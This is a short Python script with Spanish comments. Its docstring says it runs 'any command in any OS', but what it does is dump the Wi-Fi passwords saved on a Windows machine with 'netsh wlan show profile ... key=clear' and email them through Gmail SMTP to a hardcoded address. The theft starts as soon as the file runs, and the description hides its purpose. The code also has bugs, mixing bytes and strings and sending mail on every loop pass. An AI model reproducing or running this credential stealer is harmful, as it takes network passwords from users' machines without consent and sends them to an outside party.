#!/usr/bin/env python3

"""
Script for run any command in any OS
"""

import subprocess

# Mandamos un email con el resultado
import smtplib
import re


def send_mail(user, password, msg):
    con = smtplib.SMTP("smtp.gmail.com", 587)
    con.starttls()
    con.login(user, password)
    con.sendmail(user, user, msg)
    con.quit()


def search_wifi():
    """ Mostrar contraseñas wifi en WDS
        Primero mostramos las redes que estén disponibles
        """
    show_network = "netsh wlan show profile"
    result = subprocess.check_output(show_network, shell=True)
    return re.findall("(?:Profile\s*:\s)(.*)", result)


def show_pwd():
    net_names = search_wifi()
    pwd_collector = ""
    for name_net in net_names:
        command = "netsh wlan show profile " + name_net + " key=clear"
        # Ejecuta el comando pero no hace nada con él
        # subprocess.Popen(command, shell=True)
        # Ejecutamos el comando y guardamos la respuesta
        pwd_collector = pwd_collector + subprocess.check_output(command,
                                                                shell=True)
        send_mail("x@google.com", "pwd", pwd_collector)

show_pwd()
